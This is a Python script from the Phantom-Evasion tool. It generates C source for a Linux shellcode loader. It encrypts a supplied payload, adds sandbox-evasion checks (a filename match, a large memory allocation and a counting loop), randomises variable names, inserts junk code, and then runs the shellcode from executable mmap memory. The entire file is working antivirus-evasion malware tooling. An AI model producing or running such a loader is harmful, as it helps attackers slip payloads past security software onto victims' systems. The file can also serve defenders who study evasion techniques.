
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import pystache
import random
import string
import sys 
sys.path.append("Modules/payloads/auxiliar")
sys.path.append("Modules/payloads/encryption")
import platform 
import usefull
import Multibyte_xor
import Multibyte_xorPy3


template_args = {} # Dictionnary containing all keys/values for template rendering

Payload = sys.argv[1]

Filename = sys.argv[2]

Encryption = sys.argv[3]

Randbufname = usefull.varname_creator()
template_args['Randbufname'] = Randbufname

template_args['Payload'] = usefull.encoding_manager(Encryption,Payload,Randbufname)

template_args['Randgood'] = usefull.varname_creator()

template_args['Randmem'] = usefull.varname_creator()

template_args['Randbig'] = random.randrange(60000000,120000000,1000000) 	

template_args['Randcpt'] = usefull.varname_creator()

template_args['Randi'] = usefull.varname_creator()

template_args['Randptr'] = usefull.varname_creator()

template_args['Randinj'] = usefull.varname_creator()

template_args['Junkcode1'] = usefull.Junkmathinject(str(random.randint(1,16)))	        # Junkcode
template_args['Junkcode2'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode3'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode4'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode5'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode6'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode7'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode8'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
template_args['Junkcode9'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode

Hollow_code = """\
#define {{{Randgood}}} {{{Randbig}}}
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>
#include <math.h>

int main(int argc, char * argv[]){
    {{{Junkcode1}}}
    if (strstr(argv[0], "{{{Filename}}}") > 0){
        char *{{{Randmem}}} = NULL;
        {{{Randmem}}} = (char *) malloc({{{Randgood}}});
        if ({{{Randmem}}}!=NULL){
            memset({{{Randmem}}},0,{{{Randgood}}});
            free({{{Randmem}}});
            int {{{Randcpt}}} = 0;
            int {{{Randi}}} = 0;
            for({{{Randi}}} = 0;{{{Randi}}} < {{{Randgood}}}; {{{Randi}}}++){
                {{{Randcpt}}}++;
            }
            if({{{Randcpt}}} == {{{Randgood}}}){
                {{{Junkcode2}}}
                {{{Payload}}}
                {{{Junkcode3}}}
                void *{{{Randptr}}};
                {{{Junkcode4}}}
                {{{Randptr}}} = mmap(0,sizeof({{{Randbufname}}}),PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);
                {{{Junkcode5}}}
                memcpy({{{Randptr}}},{{{Randbufname}}}, sizeof({{{Randbufname}}}));
                {{{Junkcode6}}}
                int {{{Randinj}}}  = ((int(*)(void)){{{Randptr}}})();
            }else{
                {{{Junkcode7}}}
            }
        }else{
            {{{Junkcode8}}}
        }
    }else{
        {{{Junkcode9}}}
    }
    return 0;
}
"""

Hollow_code = pystache.render(Hollow_code, template_args)

with open('Source.c','wb') as f:
    f.write(Hollow_code)
